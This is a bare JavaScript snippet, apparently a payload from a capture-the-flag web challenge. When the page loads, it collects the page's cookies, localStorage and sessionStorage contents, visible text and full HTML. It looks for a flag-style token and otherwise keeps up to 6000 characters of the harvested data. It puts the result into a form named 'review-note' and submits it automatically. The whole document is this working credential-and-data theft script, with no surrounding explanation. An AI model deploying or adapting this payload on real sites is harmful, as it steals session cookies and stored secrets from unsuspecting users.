(() => {
  const start = () => {
    const form = document.getElementById('review-note');
    if (!form) return;
    const text = document.body ? document.body.innerText : '';
    const html = document.documentElement.innerHTML;
    const storage = [
      ...Object.entries(localStorage),
      ...Object.entries(sessionStorage),
    ];
    const all = [document.cookie, JSON.stringify(storage), text, html, 'provider-payload-ran'].join('\n');
    const match = all.match(/(?:firebird|flag|ctf)\{[^}]+\}/i);
    form.elements.namedItem('note').value = (match ? match[0] : all).slice(0, 6000);
    form.submit();
  };
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', start, { once: true });
  } else {
    start();
  }
})();
